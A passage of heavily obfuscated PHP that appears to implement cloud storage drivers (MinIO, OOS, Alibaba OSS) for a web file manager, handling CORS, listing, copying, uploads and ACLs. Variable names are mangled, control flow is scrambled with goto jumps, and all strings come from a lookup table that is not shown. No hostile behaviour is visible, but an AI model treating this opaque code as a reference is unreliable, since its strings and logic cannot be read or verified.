$A‰®ášºµ±; } $this->update(); } } goto dƒ±„¼œÊ§; bŒÉÉ«ãô²: class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($eÅ°ÔÑ–ì) { parent::__construct($eÅ°ÔÑ–ì); $this->signatureVersion($_SERVER[ºÖÙÂŒäÉê‡][206]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($fÈåÂÚãÄç) { parent::__construct($fÈåÂÚãÄç); $this->signatureVersion($_SERVER[ºÖÙÂŒäÉê‡][206]); } public function fileOutLink($DŠïô¸¹è) { $Cå«÷ï•® =& $_SERVER[ºÖÙÂŒäÉê‡]; if (substr($DŠïô¸¹è, 0, 7) == $Cå«÷ï•®[1098]) { $DŠïô¸¹è = $Cå«÷ï•®[1099] . substr($DŠïô¸¹è, 7); } header($Cå«÷ï•®[152] . $DŠïô¸¹è); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public function __construct($FÒÏòŒ¯è) { parent::__construct(); include_once SDK_DIR . $_SERVER[ºÖÙÂŒäÉê‡][1153]; $this->_init($FÒÏòŒ¯è); } public function _init($Fˆ½”Öê‡) { foreach ($Fˆ½”Öê‡ as $b§¤ƒ‰Ç¸ => $FÅŒ´ëßÏ‡) { if (isset($this->{$b§¤ƒ‰Ç¸})) { $this->{$b§¤ƒ‰Ç¸} = $FÅŒ´ëßÏ‡; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[ºÖÙÂŒäÉê‡][1154], !1); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto E˜¤ÃµÂ²; c¼Á¯°ˆ„: $a¾ä¡’ïà”->addAllowedOrigin($a›óõŒÀ®ß[1155]); $a¾ä¡’ïà”->addAllowedMethod($a›óõŒÀ®ß[1156]); $a¾ä¡’ïà”->addAllowedMethod($a›óõŒÀ®ß[1157]); goto Fˆ«®ó¤ÆÊ; E˜¤ÃµÂ²: $a›óõŒÀ®ß =& $_SERVER[ºÖÙÂŒäÉê‡]; $b›ôµ ®¶µ = new OSS\Model\CorsConfig(); $a¾ä¡’ïà” = new OSS\Model\CorsRule(); goto c¼Á¯°ˆ„; Cç®òòŠ•™: $a¾ä¡’ïà”->setMaxAgeSeconds(600); $a¾ä¡’ïà”->addExposeHeader($a›óõŒÀ®ß[1160]); $a¾ä¡’ïà”->addAllowedHeader($a›óõŒÀ®ß[1155]); goto Bíœš¶ïÙ†; Bíœš¶ïÙ†: $b›ôµ ®¶µ->addRule($a¾ä¡’ïà”); try { $this->client->putBucketCors($this->bucket, $b›ôµ ®¶µ); } catch (OSS\Core\OssException $fñô©˜ÌŒö) { return !1; } return !0; goto dÚèö†ãÃÓ; Fˆ«®ó¤ÆÊ: $a¾ä¡’ïà”->addAllowedMethod($a›óõŒÀ®ß[1158]); $a¾ä¡’ïà”->addAllowedMethod($a›óõŒÀ®ß[1159]); $a¾ä¡’ïà”->addAllowedMethod($a›óõŒÀ®ß[151]); goto Cç®òòŠ•™; dÚèö†ãÃÓ: } public function getBucketCors() { goto Dï•ëò²êŠ; EßÆ™‹‹ÀÜ: if (!$eÆ»ª†éÍî || !($Fô†«Ô = $eÆ»ª†éÍî->getRules())) { return null; } $b¿˜“î“î = $Fô†«Ô[0]->getAllowedOrigins(); $C‡†¨óÔğ = $Fô†«Ô[0]->getAllowedMethods(); goto FŸÒÌë§”×; Dï•ëò²êŠ: $D†Ò‹¦Ù =& $_SERVER[ºÖÙÂŒäÉê‡]; $eÆ»ª†éÍî = null; try { $eÆ»ª†éÍî = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $e¶œ´¡Šé) { return null; } goto EßÆ™‹‹ÀÜ; d˜ÊÂÅ×Õ·: return array($D†Ò‹¦Ù[181] => isset($b¿˜“î“î[0]) ? $b¿˜“î“î[0] : $D†Ò‹¦Ù[33], $D†Ò‹¦Ù[185] => $C‡†¨óÔğ, $D†Ò‹¦Ù[1161] => $Fõëá¿œ±, $D†Ò‹¦Ù[1162] => isset($E¸½àöĞŸ[0]) ? $E¸½àöĞŸ[0] : $D†Ò‹¦Ù[33], $D†Ò‹¦Ù[183] => isset($A°Û©õÃÉÕ[0]) ? $A°Û©õÃÉÕ[0] : $D†Ò‹¦Ù[33]); goto b™ÓÑ¸¾å; FŸÒÌë§”×: $Fõëá¿œ± = $Fô†«Ô[0]->getMaxAgeSeconds(); $E¸½àöĞŸ = $Fô†«Ô[0]->getExposeHeaders(); $A°Û©õÃÉÕ = $Fô†«Ô[0]->getAllowedHeaders(); goto d˜ÊÂÅ×Õ·; b™ÓÑ¸¾å: } public function isBucketCors() { goto e—Ç•ø¥éª; A‹Üéµâõ¨: if ($FÍ„öÒÚëà[$BÕ£ÉÂé[181]] != $BÕ£ÉÂé[182] || $FÍ„öÒÚëà[$BÕ£ÉÂé[183]] != $BÕ£ÉÂé[182]) { return !1; } $e‘•·æÒ‘í = array_map($BÕ£ÉÂé[184], $FÍ„öÒÚëà[$BÕ£ÉÂé[185]]); if (!is_array($e‘•·æÒ‘í)) { $e‘•·æÒ‘í = array(); } goto C©“´”“Ëˆ; e—Ç•ø¥éª: $BÕ£ÉÂé =& $_SERVER[ºÖÙÂŒäÉê‡]; $FÍ„öÒÚëà = $this->getBucketCors(); if (!$FÍ„öÒÚëà || !is_array($FÍ„öÒÚëà)) { return !1; } goto A‹Üéµâõ¨; C©“´”“Ëˆ: $E…‚„Şİğä = array($BÕ£ÉÂé[186], $BÕ£ÉÂé[187], $BÕ£ÉÂé[188], $BÕ£ÉÂé[189], $BÕ£ÉÂé[190]); $cœÚ´¥ç•Œ = array_diff($E…‚„Şİğä, $e‘•·æÒ‘í); return empty($cœÚ´¥ç•Œ); goto BìÙÏÀ·ô; BìÙÏÀ·ô: } public function mkfile($f¨˜ğˆ‡ò×, $aÊí›¹¥‚ = '', $a¼«·ª¨¸ = REPEAT_RENAME) { $d°¼ÛìĞ¼¨ = $this->setContent($f¨˜ğˆ‡ò×, $aÊí›¹¥‚); if ($d°¼ÛìĞ¼¨ !== !1) { return $this->getPathOuter($f¨˜ğˆ‡ò×); } return !1; } public function mkdir($F¨¾ìà×“©, $Bá†à±è¦ = REPEAT_SKIP) { if ($this->_isFolder($F¨¾ìà×“©)) { return $this->getPathOuter($F¨¾ìà×“©); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($F¨¾ìà×“©)); } catch (OSS\Core\OssException $A… ùªî¶) { return !1; } return $this->getPathOuter($F¨¾ìà×“©); } private function fileList($F­±ëí‡‚Á, $Dö×Ã„ª”² = '', $cÆ»œ®æÔÔ = 0) { goto fÂêÕ¢•Ç; cŒŸğï‡§¾: $eøÆåé³¾¾ = $E‰ó±â¼«Õ[33]; $dôÈµˆŸó = 1000; $Eµ³– ‚µÅ = $aƒñ«ÍˆÛ™ = array(); goto eçÙçÖ©ö¨; fÂêÕ¢•Ç: $E‰ó±â¼«Õ =& $_SERVER[ºÖÙÂŒäÉê‡]; $F­±ëí‡‚Á = trim($F­±ëí‡‚Á, $E‰ó±â¼«Õ[8]); $f—ÊÜÂÓ¦– = empty($F­±ëí‡‚Á) ? $E‰ó±â¼«Õ[33] : $F­±ëí‡‚Á . $E‰ó±â¼«Õ[8]; goto cŒŸğï‡§¾; eçÙçÖ©ö¨: while (!0) { $d™¤¦Ï‚¥ = array($E‰ó±â¼«Õ[1163] => $Dö×Ã„ª”², $E‰ó±â¼«Õ[192] => $f—ÊÜÂÓ¦–, $E‰ó±â¼«Õ[1164] => $dôÈµˆŸó, $E‰ó±â¼«Õ[1165] => $eøÆåé³¾¾); try { $e›æ×Ç¸İ = $this->client->listObjects($this->bucket, $d™¤¦Ï‚¥); } catch (OSS\Core\OssException $eÊÔçæ ñĞ) { break; } $eøÆåé³¾¾ = $e›æ×Ç¸İ->getNextMarker(); $D‚–˜¦… = $e›æ×Ç¸İ->getObjectList(); $cÙ¡ÈÜÑôõ = $e›æ×Ç¸İ->getPrefixList(); foreach ($D‚–˜¦… as $bÄ™Š‡Òšğ) { if ($bÄ™Š‡Òšğ->getKey() == $f—ÊÜÂÓ¦–) { continue; } $eÆ÷Õ™ÁèË = $bÄ™Š‡Òšğ->getKey(); if ($cÆ»œ®æÔÔ) { $eÆ÷Õ™ÁèË = array($E‰ó±â¼«Õ[28] => $eÆ÷Õ™ÁèË, $E‰ó±â¼«Õ[77] => $bÄ™Š‡Òšğ->getSize(), $E‰ó±â¼«Õ[196] => strtotime($bÄ™Š‡Òšğ->getLastModified())); } $aƒñ«ÍˆÛ™[] = $eÆ÷Õ™ÁèË; } foreach ($cÙ¡ÈÜÑôõ as $eÑ›‰ˆ¼‹÷) { $Eµ³– ‚µÅ[] = $eÑ›‰ˆ¼‹÷->getPrefix(); } if ($eøÆåé³¾¾ === $E‰ó±â¼«Õ[33]) { break; } } return array($E‰ó±â¼«Õ[74] => $Eµ³– ‚µÅ, $E‰ó±â¼«Õ[73] => $aƒñ«ÍˆÛ™); goto Aâ‡Ø®ñÓ; Aâ‡Ø®ñÓ: } public function copyFile($EÍŸˆ˜Ó‘, $A¤×ÊãÖç) { $e¦Š´ˆ˜÷â = $this->size($EÍŸˆ˜Ó‘); if ($e¦Š´ˆ˜÷â < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $EÍŸˆ˜Ó‘, $this->bucket, $this->pathEncode($A¤×ÊãÖç)); } catch (OSS\Core\OssException $c’ÈÕÓŞ») { return !1; } return !0; } return $this->multiCopyObject($EÍŸˆ˜Ó‘, $A¤×ÊãÖç, $e¦Š´ˆ˜÷â); } private function multiCopyObject($d¦åéëì©ù, $a˜¦‹™…Áµ, $cŠİ´ö†çœ) { $fò‘µ‰Ÿ• =& $_SERVER[ºÖÙÂŒäÉê‡]; try { goto fÒ¨Éñ‘; fÒ¨Éñ‘: $dàœÓÆ”ˆ÷ = array(); if ($Aò‘Õ‰ßø = $this->hashMd5($d¦åéëì©ù)) { $dàœÓÆ”ˆ÷ = array(OSS\OssClient::OSS_HEADERS => array($fò‘µ‰Ÿ•[1166] => $Aò‘Õ‰ßø)); } $F¼ĞÄ…×Ä = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($a˜¦‹™…Áµ), $dàœÓÆ”ˆ÷); goto c‘ŠÌ½­È¥; c‘ŠÌ½­È¥: $A±¼Œ„«É— = 1; $f«„“°¥µó = 0; $cŞ´ôÏ‚ëö = array(); goto AÚÃÅÊ”«—; aƒ”»Ğí¯ê: $A¼¿í¡‡ = array(); foreach ($cŞ´ôÏ‚ëö as $AÃÔÃ»«¿ƒ => $cĞî¤öé ‹) { $A¼¿í¡‡[] = array($fò‘µ‰Ÿ•[1170] => $AÃÔÃ»«¿ƒ + 1, $fò‘µ‰Ÿ•[1171] => $cĞî¤öé ‹); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($a˜¦‹™…Áµ), $F¼ĞÄ…×Ä, $A¼¿í¡‡); goto e·Ü›Ôø¿ê; AÚÃÅÊ”«—: $FŒ®ˆˆè° = 1024 * 1024 * 10; $A¦¬ÅêŞ©“ = $this->client->generateMultiuploadParts($cŠİ´ö†çœ, $FŒ®ˆˆè°); foreach ($A¦¬ÅêŞ©“ as $AÃÔÃ»«¿ƒ => $bå”±ğñÄ§) { $b¸î«¡ª¡ = $f«„“°¥µó + (int) $bå”±ğñÄ§[$fò‘µ‰Ÿ•[1167]]; $EéØÊÜª = (int) $bå”±ğñÄ§[$fò‘µ‰Ÿ•[330]] + $b¸î«¡ª¡ - 1; $cØŠŞ¤ô¼È = array($fò‘µ‰Ÿ•[1168] => $b¸î«¡ª¡, $fò‘µ‰Ÿ•[1169] => $EéØÊÜª); $cŞ´ôÏ‚ëö[] = $this->client->uploadPartCopy($this->bucket, $d¦åéëì©ù, $this->bucket, $this->pathEncode($a˜¦‹™…Áµ), $A±¼Œ„«É—, $F¼ĞÄ…×Ä, $cØŠŞ¤ô¼È); $A±¼Œ„«É— = $A±¼Œ„«É— + 1; } goto aƒ”»Ğí¯ê; e·Ü›Ôø¿ê: } catch (OSS\Core\OssException $a•ÆÅ¯Òˆç) { return !1; } return !0; } public function moveFile($B ÆÜ’ªÄ, $fƒ“âóî¯) { if ($this->copyFile($B ÆÜ’ªÄ, $fƒ“âóî¯)) { $this->remove($B ÆÜ’ªÄ); return !0; } return !1; } public function delFile($aÇÍˆƒÍˆ) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($aÇÍˆƒÍˆ)); } catch (OSS\Core\OssException $CÁš ×†²Š) { return !1; } return !0; } public function delFolder($F­Ø–šÀ Š) { $BÅâÔÇä•¶ =& $_SERVER[ºÖÙÂŒäÉê‡]; $C÷©ï†Åé = $this->fileList($F­Ø–šÀ Š); if (!empty($F­Ø–šÀ Š) && !in_array(trim($F­Ø–šÀ Š, $BÅâÔÇä•¶[8]) . $BÅâÔÇä•¶[8], $C÷©ï†Åé[$BÅâÔÇä•¶[73]])) { $C÷©ï†Åé[$BÅâÔÇä•¶[73]][] = trim($F­Ø–šÀ Š, $BÅâÔÇä•¶[8]) . $BÅâÔÇä•¶[8]; } foreach (array_chunk($C÷©ï†Åé[$BÅâÔÇä•¶[73]], 1000) as $DÔøÅÃè³™) { try { $this->client->deleteObjects($this->bucket, $DÔøÅÃè³™); } catch (OSS\Core\OssException $a•¡ó½”ã) { continue; } } return !0; } public function rename($fŞØÙİÒÓÆ, $bøø‚à°Ë¬) { return $this->renameObject($fŞØÙİÒÓÆ, $bøø‚à°Ë¬); } private function fileInfo($F°°”Š¾•, $ağ·¿Û©„¢ = array()) { goto cõÓ«İ¾; cõÓ«İ¾: $c†ë’”†Õ =& $_SERVER[ºÖÙÂŒäÉê‡]; $E‘·•¿¤‹ = array($c†ë’”†Õ[28] => $this->pathThis($F°°”Š¾•), $c†ë’”†Õ[75] => $this->getPathOuter($F°°”Š¾•), $c†ë’”†Õ[29] => $c†ë’”†Õ[163], $c†ë’”†Õ[193] => 0, $c†ë’”†Õ[106] => 0, $c†ë’”†Õ[77] => 0, $c†ë’”†Õ[156] => $this->ext($F°°”Š¾•), $c†ë’”†Õ[194] => !0, $c†ë’”†Õ[195] => !0); if (empty($ağ·¿Û©„¢)) { $D£Ï÷î‰ß‡ = $this->objectMeta($F°°”Š¾•); if (!$D£Ï÷î‰ß‡) { return $E‘·•¿¤‹; } $ağ·¿Û©„¢ = array($c†ë’”†Õ[106] => strtotime($D£Ï÷î‰ß‡[$c†ë’”†Õ[1172]]), $c†ë’”†Õ[77] => $D£Ï÷î‰ß‡[$c†ë’”†Õ[1173]] + 0); } goto CÑŠÜ‘êš; CÑŠÜ‘êš: if (isset($ağ·¿Û©„¢[$c†ë’”†Õ[77]])) { $E‘·•¿¤‹[$c†ë’”†Õ[77]] = $ağ·¿Û©„¢[$c†ë’”†Õ[77]]; } if (isset($ağ·¿Û©„¢[$c†ë’”†Õ[106]])) { $E‘·•¿¤‹[$c†ë’”†Õ[106]] = $ağ·¿Û©„¢[$c†ë’”†Õ[106]]; } if (isset($ağ·¿Û©„¢[$c†ë’”†Õ[196]]) && !trim($E‘·•¿¤‹[$c†ë’”†Õ[106]])) { $E‘·•¿¤‹[$c†ë’”†Õ[106]] = $ağ·¿Û©„¢[$c†ë’”†Õ[196]]; } goto AùÇŠ™Ç¹¸; AùÇŠ™Ç¹¸: return $E‘·•¿¤‹; goto fÂ‘Ş“È»ˆ; fÂ‘Ş“È»ˆ: } private function folderInfo($EŒŠ–ÓÕ©, $aØøƒ—ˆÑŠ = array()) { $dßîÔ³ë×ä =& $_SERVER[ºÖÙÂŒäÉê‡]; $Cˆã—‰ÚÓ = array($dßîÔ³ë×ä[28] => $this->pathThis($EŒŠ–ÓÕ©), $dßîÔ³ë×ä[75] => $this->getPathOuter($dßîÔ³ë×ä[8] . $EŒŠ–ÓÕ©), $dßîÔ³ë×ä[29] => $dßîÔ³ë×ä[76], $dßîÔ³ë×ä[193] => 0, $dßîÔ³ë×ä[106] => 0, $dßîÔ³ë×ä[194] => !0, $dßîÔ³ë×ä[195] => !0); if (empty($aØøƒ—ˆÑŠ)) { $EŒŠ–ÓÕ© = rtrim($EŒŠ–ÓÕ©, $dßîÔ³ë×ä[8]) . $dßîÔ³ë×ä[8]; $BÍñ›¡±Óˆ = $this->objectMeta($EŒŠ–ÓÕ©); if (!$BÍñ›¡±Óˆ) { return $Cˆã—‰ÚÓ; } $aØøƒ—ˆÑŠ = array($dßîÔ³ë×ä[193] => $BÍñ›¡±Óˆ[$dßîÔ³ë×ä[1174]][$dßîÔ³ë×ä[1175]], $dßîÔ³ë×ä[106] => strtotime($BÍñ›¡±Óˆ[$dßîÔ³ë×ä[1172]])); } if (isset($aØøƒ—ˆÑŠ[$dßîÔ³ë×ä[106]])) { $Cˆã—‰ÚÓ[$dßîÔ³ë×ä[106]] = $aØøƒ—ˆÑŠ[$dßîÔ³ë×ä[106]]; } if (isset($aØøƒ—ˆÑŠ[$dßîÔ³ë×ä[193]])) { $Cˆã—‰ÚÓ[$dßîÔ³ë×ä[193]] = $aØøƒ—ˆÑŠ[$dßîÔ³ë×ä[193]]; } return $Cˆã—‰ÚÓ; } public function listPath($c—ÁŠÏ±ØÛ, $Fºí·Ìã¿ = false) { $F©ÅšîÎƒ‰ =& $_SERVER[ºÖÙÂŒäÉê‡]; $côó‹¦÷ªŒ = $this->fileList($c—ÁŠÏ±ØÛ, $F©ÅšîÎƒ‰[8], !0); foreach ($côó‹¦÷ªŒ[$F©ÅšîÎƒ‰[74]] as $fÇ¹½‘é => $B„ ¶…¾ƒï) { $côó‹¦÷ªŒ[$F©ÅšîÎƒ‰[74]][$fÇ¹½‘é] = $this->folderInfo($B„ ¶…¾ƒï, $B„ ¶…¾ƒï); } foreach ($côó‹¦÷ªŒ[$F©ÅšîÎƒ‰[73]] as $fÇ¹½‘é => $B„ ¶…¾ƒï) { $côó‹¦÷ªŒ[$F©ÅšîÎƒ‰[73]][$fÇ¹½‘é] = $this->fileInfo($B„ ¶…¾ƒï[$F©ÅšîÎƒ‰[28]], $B„ ¶…¾ƒï); } return $côó‹¦÷ªŒ; } public function has($EİÖœË¾ç˜, $BíĞÖ—‰ê = false, $bÃÁÎè÷†· = true) { goto FË’…é‡ôå; D»Ú÷½¦×Ô: $fŸ•Ù…ğ¥± = $Dçö¤¾é¡Ş[33]; $F«Ü›³”›ò = 500; $E‘âƒ¯Ï§– = 0; goto Añƒ…¼½Â; Cì÷Ğ¹¦Ö‡: return !1; goto b„öá‡ù§ô; Añƒ…¼½Â: $DÔÑ×¡Ã•Å = 0; while (!0) { $DÖ’èĞš = array($Dçö¤¾é¡Ş[1163] => $Dçö¤¾é¡Ş[8], $Dçö¤¾é¡Ş[192] => $fôİö¡‹ÕŸ, $Dçö¤¾é¡Ş[1164] => $F«Ü›³”›ò, $Dçö¤¾é¡Ş[1165] => $fŸ•Ù…ğ¥±); try { $fò¾™ïÄØî = $this->client->listObjects($this->bucket, $DÖ’èĞš); } catch (OSS\Core\OssException $dšºÜÌ¥ø‚) { break; } $fŸ•Ù…ğ¥± = $fò¾™ïÄØî->getNextMarker(); $dŞ¨•ì¨É = $fò¾™ïÄØî->getObjectList(); $bğ¬ê®ê“ = $fò¾™ïÄØî->getPrefixList(); if ($BíĞÖ—‰ê) { if (count($dŞ¨•ì¨É) > 1 || count($dŞ¨•ì¨É) == 1 && $dŞ¨•ì¨É[0]->getKey() != $fôİö¡‹ÕŸ) { $E‘âƒ¯Ï§– += count($dŞ¨•ì¨É) - 1; } if (!empty($bğ¬ê®ê“)) { $DÔÑ×¡Ã•Å += count($bğ¬ê®ê“); } if ($fŸ•Ù…ğ¥± === $Dçö¤¾é¡Ş[33]) { break; } continue; } if ($bÃÁÎè÷†·) { if (!empty($dŞ¨•ì¨É)) { if (count($dŞ¨•ì¨É) > 1 || $dŞ¨•ì¨É[0]->getKey() != $fôİö¡‹ÕŸ) { return !0; } } } else { if (!empty($bğ¬ê®ê“)) { return !0; } } if ($fŸ•Ù…ğ¥± === $Dçö¤¾é¡Ş[33]) { break; } } if ($BíĞÖ—‰ê) { return array($Dçö¤¾é¡Ş[197] => $E‘âƒ¯Ï§–, $Dçö¤¾é¡Ş[198] => $DÔÑ×¡Ã•Å); } goto Cì÷Ğ¹¦Ö‡; FË’…é‡ôå: $Dçö¤¾é¡Ş =& $_SERVER[ºÖÙÂŒäÉê‡]; $EİÖœË¾ç˜ = trim($EİÖœË¾ç˜, $Dçö¤¾é¡Ş[8]); $fôİö¡‹ÕŸ = empty($EİÖœË¾ç˜) ? $Dçö¤¾é¡Ş[33] : $EİÖœË¾ç˜ . $Dçö¤¾é¡Ş[8]; goto D»Ú÷½¦×Ô; b„öá‡ù§ô: } public function listAll($Fà§àáÚã®) { $F³Õ—¼ç =& $_SERVER[ºÖÙÂŒäÉê‡]; $F±‰‰­Ãß = $this->fileList($Fà§àáÚã®, $F³Õ—¼ç[33], !0); $A˜êáÀØ× = array(); foreach ($F±‰‰­Ãß[$F³Õ—¼ç[73]] as $E¡®âçî‰) { $A˜êáÀØ×[$E¡®âçî‰[$F³Õ—¼ç[28]]] = $E¡®âçî‰[$F³Õ—¼ç[77]]; } return $this->listAllFiles($Fà§àáÚã®, array_keys($A˜êáÀØ×), $A˜êáÀØ×); } public function canRead($e¶Í¹•´®â) { $Cóá‡öŒË¸ =& $_SERVER[ºÖÙÂŒäÉê‡]; $AíÁ“³èĞ£ = $this->pathAcl($e¶Í¹•´®â); return $AíÁ“³èĞ£ == $Cóá‡öŒË¸[1176] || $AíÁ“³èĞ£ == $Cóá‡öŒË¸[495] ? !0 : !1; } public function canWrite($BİòòÂ»Í) { $cŠÂÉÉÄÚË = $this->pathAcl($BİòòÂ»Í); return $cŠÂÉÉÄÚË == $_SERVER[ºÖÙÂŒäÉê‡][495] ? !0 : !1; } public function pathAcl($F×øñí¹õâ) { goto EÚšœ±Í; b›‹º¼ÕŒ: $EİÎé‹êè = $c¶ùÖ‰Œ¬ == $f˜‰•¯Ñ“ç[34] ? $this->bucketAcl : $c¶ùÖ‰Œ¬; if ($EİÎé‹êè == $f˜‰•¯Ñ“ç[1177]) { return $f˜‰•¯Ñ“ç[1176]; } if ($EİÎé‹êè == $f˜‰•¯Ñ“ç[1178]) { return $f˜‰•¯Ñ“ç[495]; } goto BÒ£¦Æ¢; EÚšœ±Í: $f˜‰•¯Ñ“ç =& $_SERVER[ºÖÙÂŒäÉê‡]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $c¶ùÖ‰Œ¬ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($F×øñí¹õâ)); } catch (OSS\Core\OssException $B‘ôó†ùî¨) { return !1; } goto b›‹º¼ÕŒ; BÒ£¦Æ¢: return $EİÎé‹êè; goto dÒŒçÍàğ; dÒŒçÍàğ: } private function chmodPath($d¡›øêô¸, $cÚ¤ï„Ê¥º = '') { $C™‰½×¹‚ =& $_SERVER[ºÖÙÂŒäÉê‡]; $Bó­ôñğ… = empty($cÚ¤ï„Ê¥º) ? $C™‰½×¹‚[1178] : $cÚ¤ï„Ê¥º; $b¦ĞìÍ«„ = array($C™‰½×¹‚[34], $C™‰½×¹‚[191], $C™‰½×¹‚[1177], $C™‰½×¹‚[1178]); if (!in_array($Bó­ôñğ…, $b¦ĞìÍ«„)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($d¡›øêô¸), $Bó­ôñğ…); } catch (OSS\Core\OssException $Dƒ ôöÚ¿º) { return !1; } return !0; } public function getContent($dªäÕ´ÄŸÍ) { return $this->fileSubstr($dªäÕ´ÄŸÍ, -1); } public function setContent($dà‡ˆ²Õ, $bÔ‡–ñÚæå = '') { $c”ÈÔ§õ‹é =& $_SERVER[ºÖÙÂŒäÉê‡]; try { $D´ê­Ô»Ã = $this->trafficLimit($c”ÈÔ§õ‹é[1179]); $A©ŸĞ‹àƒ = $this->client->putObject($this->bucket, $this->pathEncode($dà‡ˆ²Õ), $bÔ‡–ñÚæå, $D´ê­Ô»Ã); } catch (OSS\Core\OssException $fÃíİ¹—È) { return !1; } $FÃ“ïÑ•£æ = array($c”ÈÔ§õ‹é[1166] => trim($A©ŸĞ‹àƒ[$c”ÈÔ§õ‹é[1180]], $c”ÈÔ§õ‹é[112]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($dà‡ˆ²Õ))); $this->updateObjMeta($dà‡ˆ²Õ, $FÃ“ïÑ•£æ); return isset($A©ŸĞ‹àƒ[$c”ÈÔ§õ‹é[1181]][$c”ÈÔ§õ‹é[1128]]) ? (int) $A©ŸĞ‹àƒ[$c”ÈÔ§õ‹é[1181]][$c”ÈÔ§õ‹é[1128]] : strlen($A©ŸĞ‹àƒ); } private function updateObjMeta($a–¿æ®¾İŠ, $C‘–íƒ¯¦÷) { $a–¿æ®¾İŠ = $this->pathEncode($a–¿æ®¾İŠ); try { $cµ±Ê®—Ñ« = array(OSS\OssClient::OSS_HEADERS => $C‘–íƒ¯¦÷); $this->client->copyObject($this->bucket, $a–¿æ®¾İŠ, $this->bucket, $a–¿æ®¾İŠ, $cµ±Ê®—Ñ«); } catch (OSS\Core\OssException $DŸØÙ¯³ºÌ) { return !1; } return !0; } public function upload($cŠåÉÙ²¹, $AŠ¨ºÚ™Ç¼, $a™‚»°ó‰Ù = false, $e‚Ä¬£ÃÓ = REPEAT_REPLACE) { $e¨¯´Šô¹ =& $_SERVER[ºÖÙÂŒäÉê‡]; $Fİª¦ĞËòÈ = trim($cŠåÉÙ²¹, $e¨¯´Šô¹[8]); $bŠÉ‘”ªô = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($e¨¯´Šô¹[1166] => @md5_file($AŠ¨ºÚ™Ç¼)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($cŠåÉÙ²¹))); $bŠÉ‘”ªô = $this->trafficLimit($e¨¯´Šô¹[1179], $bŠÉ‘”ªô); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($Fİª¦ĞËòÈ), $AŠ¨ºÚ™Ç¼, $bŠÉ‘”ªô); } catch (OSS\Core\OssException $C•òŞ”àœ–) { return !1; } return $this->getPathOuter($cŠåÉÙ²¹); } public function getHost() { $bÜÔ¬Ú†ø =& $_SERVER[ºÖÙÂŒäÉê‡]; $BÖõÜİÊ…Í = explode($bÜÔ¬Ú†ø[167], parent::getHost()); return $BÖõÜİÊ…Í[0] . $bÜÔ¬Ú†ø[167] . $this->bucket . $bÜÔ¬Ú†ø[91] . $BÖõÜİÊ…Í[1]; } public function uploadFormData($Eˆì‹Ô‡Ñ‘, $CÆ¾ïõìÓƒ = 3600) { goto cìÊİˆœè–; A‘œÁÍòÌË: $f™Û—è¡ÔÌ = date($EÚèô·©œĞ[1182], time() + $FÊÎÚê‰õ…); $F†Û‘ÉÕ¥Ğ = new DateTime($f™Û—è¡ÔÌ); $dì³—ÁÓÄ‚ = $F†Û‘ÉÕ¥Ğ->format(DateTime::ISO8601); goto Bå‰¼…÷âº; bƒòïÖÒ¾å: $CĞ™Ö‹ä„ = base64_encode(hash_hmac($EÚèô·©œĞ[223], $føˆôßÁáè, $this->secret, !0)); $C‰¾¥Š¨šË = array($EÚèô·©œĞ[1095] => $føˆôßÁáè, $EÚèô·©œĞ[1185] => $this->accessKey, $EÚèô·©œĞ[1091] => $EÚèô·©œĞ[1083], $EÚèô·©œĞ[1186] => $CĞ™Ö‹ä„, $EÚèô·©œĞ[165] => $c‰±ñŒóæå); $C‰¾¥Š¨šË = $this->trafficLimit($EÚèô·©œĞ[1179], $C‰¾¥Š¨šË); goto C§îÃçâÀ; fåÊ·ºÛè: $c‰¶òî¡“› = $this->pathFather($Eˆì‹Ô‡Ñ‘); $b˜–¥Öí£î = array($EÚèô·©œĞ[1085] => $dì³—ÁÓÄ‚, $EÚèô·©œĞ[1086] => array(array($EÚèô·©œĞ[1184], 0, $CÛô±§ñá), array($EÚèô·©œĞ[1089], $EÚèô·©œĞ[1090], $c‰¶òî¡“›))); $føˆôßÁáè = base64_encode(json_encode($b˜–¥Öí£î)); goto bƒòïÖÒ¾å; cìÊİˆœè–: $EÚèô·©œĞ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!($c‰±ñŒóæå = $this->getHost())) { return !1; } $FÊÎÚê‰õ… = $CÆ¾ïõìÓƒ; goto A‘œÁÍòÌË; Bå‰¼…÷âº: $Aâé§ÄÍõ‘ = strpos($dì³—ÁÓÄ‚, $EÚèô·©œĞ[289]); $dì³—ÁÓÄ‚ = substr($dì³—ÁÓÄ‚, 0, $Aâé§ÄÍõ‘) . $EÚèô·©œĞ[1183]; $CÛô±§ñá = 1048576000 * 5; goto fåÊ·ºÛè; C§îÃçâÀ: return $C‰¾¥Š¨šË; goto bêÛ»ê; bêÛ»ê: } public function multiUploadFormData($Fµñ²‹÷•, $bÅŠğËÁÌ¸ = 3600) { $E¯´ì´×Ş =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!($C×½œô„©ğ = $this->getHost())) { return !1; } $b—î§Â¦¡ß = $this->trafficLimit($E¯´ì´×Ş[1179]); $dğï°šÒã = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($Fµñ²‹÷•), $b—î§Â¦¡ß); return 